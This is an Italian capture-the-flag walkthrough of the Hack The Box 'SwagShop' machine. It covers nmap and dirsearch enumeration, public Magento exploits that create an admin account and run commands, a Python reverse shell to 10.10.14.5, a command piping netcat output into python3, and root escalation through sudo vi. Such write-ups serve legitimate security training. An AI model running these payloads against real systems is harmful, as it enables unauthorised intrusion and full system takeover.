# SwagShop

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.140
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Host is up (0.055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/6%OT=22%CT=1%CU=42848%PV=Y%DS=2%DC=I%G=Y%TM=6548E6D
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Aggiungo _swagshop.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration

Innanzitutto, visito la pagina http://swagshop.htb/:

<p align="center">
  <img src="/Immagini/Linux-Box/SwagShop/swagshop-1.png" />
</p>

Provo ad utilizzare il comando _dirsearch_:

```text
dirsearch -u http://swagshop.htb/
```

```text
[08:21:43] Starting:
[08:21:46] 301 -  309B  - /js  ->  http://swagshop.htb/js/
[08:21:47] 403 -  277B  - /.ht_wsr.txt
[08:21:47] 403 -  277B  - /.htaccess.bak1
[08:21:47] 403 -  277B  - /.htaccess.sample
[08:21:47] 403 -  277B  - /.htaccess.orig
[08:21:47] 403 -  277B  - /.htaccess_sc
[08:21:47] 403 -  277B  - /.htaccess.save
[08:21:47] 403 -  277B  - /.htaccess_extra
[08:21:47] 403 -  277B  - /.htaccessOLD
[08:21:47] 403 -  277B  - /.htaccessOLD2
[08:21:47] 403 -  277B  - /.htm
[08:21:47] 403 -  277B  - /.htpasswds
[08:21:47] 403 -  277B  - /.httr-oauth
[08:21:47] 403 -  277B  - /.htpasswd_test
[08:21:47] 403 -  277B  - /.html
[08:21:48] 403 -  277B  - /.htaccessBAK
[08:21:48] 403 -  277B  - /.htaccess_orig
[08:21:48] 403 -  277B  - /.php
[08:21:48] 403 -  277B  - /.php3
[08:21:53] 200 -   10KB - /LICENSE.txt
[08:22:12] 200 -   37B  - /api.php
[08:22:12] 301 -  310B  - /app  ->  http://swagshop.htb/app/
[08:22:13] 403 -  277B  - /app/.htaccess
[08:22:13] 200 -    2KB - /app/
[08:22:13] 200 -    5KB - /app/etc/config.xml
[08:22:13] 200 -    9KB - /app/etc/local.xml.additional
[08:22:13] 200 -    2KB - /app/etc/local.xml.template
[08:22:13] 200 -    2KB - /app/etc/local.xml
[08:22:27] 200 -    0B  - /cron.php
[08:22:27] 200 -  717B  - /cron.sh
[08:22:27] 200 -  571KB - /RELEASE_NOTES.txt
[08:22:32] 301 -  313B  - /errors  ->  http://swagshop.htb/errors/
[08:22:32] 200 -    2KB - /errors/
[08:22:33] 200 -    1KB - /favicon.ico
[08:22:37] 200 -  946B  - /includes/
[08:22:37] 301 -  315B  - /includes  ->  http://swagshop.htb/includes/
[08:22:37] 200 -   16KB - /index.php
[08:22:38] 200 -   44B  - /install.php
[08:22:39] 200 -    4KB - /js/tiny_mce/
[08:22:40] 301 -  318B  - /js/tiny_mce  ->  http://swagshop.htb/js/tiny_mce/
[08:22:40] 200 -    3KB - /lib/
[08:22:40] 301 -  310B  - /lib  ->  http://swagshop.htb/lib/
[08:22:44] 200 -    2KB - /media/
[08:22:44] 301 -  312B  - /media  ->  http://swagshop.htb/media/
[08:22:51] 200 -  886B  - /php.ini.sample
[08:22:54] 301 -  314B  - /pkginfo  ->  http://swagshop.htb/pkginfo/
[08:22:59] 403 -  277B  - /server-status/
[08:22:59] 403 -  277B  - /server-status
[08:23:00] 301 -  312B  - /shell  ->  http://swagshop.htb/shell/
[08:23:00] 200 -    2KB - /shell/
[08:23:01] 301 -  311B  - /skin  ->  http://swagshop.htb/skin/
[08:23:09] 200 -    4KB - /var/cache/
[08:23:09] 301 -  310B  - /var  ->  http://swagshop.htb/var/
[08:23:09] 200 -  755B  - /var/backups/
[08:23:09] 200 -    2KB - /var/
[08:23:09] 200 -    9KB - /var/package/
```

Verifico la presenza di vulnerabilità relative a _Magento_ tramite _searchsploit_:

<p align="center">
  <img src="/Immagini/Linux-Box/SwagShop/swagshop-4.png" />
</p>

Mi sembra ci sia abbastanza materiale per poter passare alla fase successiva.

## Exploitation


Tra queste vulnerabilità, quella più interessante mi sembra la _37977.py_. Scarico il file, modifico il campo target inserendo http://swagshop.htb/index.php e lo eseguo ottenendo il seguente risultato:

```text
WORKED
Check http://swagshop.htb/index.php/admin with creds forme:forme
```

Quindi visito il sito indicato e inserisco le credenziali:

<p align="center">
  <img src="/Immagini/Linux-Box/SwagShop/swagshop-2.png" />
</p>

<p align="center">
  <img src="/Immagini/Linux-Box/SwagShop/swagshop-3.png" />
</p>

Una volta ottenuto l'accesso, provo ad utilizzare l'exploit _37811.py_.

Dopo aver studiato il funzionamento del codice, modifico i campi username e password con quelli dell'utenza creata precedentemete e il campo _install_date_ con la data che trovo al seguente indirizzo http://swagshop.htb/app/etc/local.xml.

Quindi lancio questo comando:

```text
python2 script2.py http://swagshop.htb/index.php/admin "uname -a"
```

E ottengo il seguente risultato:

```text
Linux swagshop 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

**Sfruttando questo script navigo tra le directory e trovo il primo flag!**

```text
python2 37811.py http://swagshop.htb/index.php/admin "cat /home/haris/user.txt"
```

## Privilege Escalation

Ora devo cercare di ottenere una shell.

Prima di tutto creo il seguente script in python _shell.py_:

```text
import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.5",443));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

import pty;

pty.spawn("/bin/bash")
```

Avvio un listener sulla porta 443:

```text
nc -nlvp 443
```

E uno sulla porta 1234:

```text
nc -lvp 1234 < shell.py
```

Successivamente lancio il seguente comando:

```text
python2 37811.py http://swagshop.htb/index.php/admin "nc 10.10.14.5 1234 | python3"
```

Ottengo cosi la shell:

<p align="center">
  <img src="/Immagini/Linux-Box/SwagShop/swagshop-5.png" />
</p>

Lancio il seguente comando:

```text
sudo -l
```

Il risultato è il seguente:

```text
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

**Quindi seguo questa [guida](https://gtfobins.github.io/gtfobins/vi/) e divento root!**

<p align="center">
  <img src="/Immagini/Linux-Box/SwagShop/swagshop-6.png" />
</p>

## Credits

- [Ivan](https://ivanitlearning.wordpress.com/2020/09/15/hackthebox-swagshop/)
